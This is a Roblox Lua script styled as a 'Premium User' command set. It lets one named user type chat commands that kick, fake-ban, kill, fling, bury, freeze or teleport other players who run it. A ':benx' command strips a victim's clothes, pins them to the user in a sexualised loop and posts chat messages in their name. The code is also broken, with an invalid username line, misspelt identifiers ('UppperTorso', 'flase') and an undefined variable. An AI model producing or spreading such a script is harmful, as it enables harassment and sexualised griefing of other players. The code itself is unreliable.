--// Premium User //--
local user_premium__001 = game.paste your roblox name here --// Replace "and here with your username" (NOT DISPLAY) //--

-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------

--// Premium Commands //--
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":kick .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer:Kick("Kicked by Premium user")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":fling .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":benx .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
			local benxed = true
			while benxed == true do
				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
				pcall(function()
    					hummy.Parent.Pants:Destroy()
				end)
				pcall(function()
    					hummy.Parent.Shirt:Destroy()
				end)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
			end
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":unbenx .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			benxPos = player.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
			wait(7)
			player.Character.HumanoidRootPart.CFrame = benxPos
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":freeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			freeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			unfreeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":thaw .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			unfreeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":ban .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":kill .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":premcmds") then
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":void .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":bring .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":grave .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":ungrave .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":grave me") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":ungrave me") then
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":kick me") then
		if game.Players.LocalPlayer == user_premium__001 then
			game.Players.LocalPlayer:Kick("Kicked yourself")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":freeze me") then
		if game.Players.LocalPlayer == user_premium__001 then
			freeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":unfreeze me") then
		if game.Players.LocalPlayer == user_premium__001 then
			unfreeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":thaw me") then
		if game.Players.LocalPlayer == user_premium__001 then
			unfreeze()
		end
	end

end)

---------------------------------------------------------------------

user_premium__001.Chatted:connect(function(cht)
	if cht:match(":cmds") then
		if game.Players.LocalPlayer == user_premium__001 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Cmds:";
	Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling";
	Time = 50;
	Icon = "rbxassetid://505845268";
})
		end
	end

end)
---------------------

if game.Players.LocalPlayer == user_premium__001 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Premium Loaded";
	Text = "";
	Time = 10;
	Icon = "rbxassetid://505845268";
})
else
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "No Premium!";
	Text = "D:";
	Time = 10;
})
end